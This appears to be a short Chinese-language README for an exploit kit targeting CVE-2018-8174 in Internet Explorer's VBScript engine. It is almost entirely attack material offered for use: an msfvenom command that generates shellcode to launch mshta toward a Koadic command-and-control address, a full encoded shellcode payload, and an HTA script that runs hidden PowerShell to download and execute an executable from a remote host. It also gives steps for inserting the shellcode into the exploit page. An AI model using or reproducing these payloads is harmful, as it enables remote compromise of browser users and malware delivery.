# CVE-2018-8174 REC

`msfvenom -p windows/exec cmd='mshta koadic 的地址' -f js_le exitfunc=thread -a x86`

`测试payload`

       msfvenom -p windows/exec cmd=calc.exe -f js_le exitfunc=thread -a x86

    %ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u575 2%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%u1de0%u0a2a%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u652e%u6578%u4100

`hta code`
    
    <script>
    a=new ActiveXObject("WScript.Shell");
    a.run('%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'http://xxx.com/xxx.exe\', \'c:/windows/temp/xxx.exe\'); c:/windows/temp/xxx.exe', 0);window.close();
    </script>
    
    
    
    
    生成后打开html文件夹更改166行左右的shellcode位置 填写msf生成的payload   
    自己看着改
    
    
    演示视频地址：https://pan.baidu.com/s/1eTezME-wh7_qNJaveNOyaw 密码：s0kq
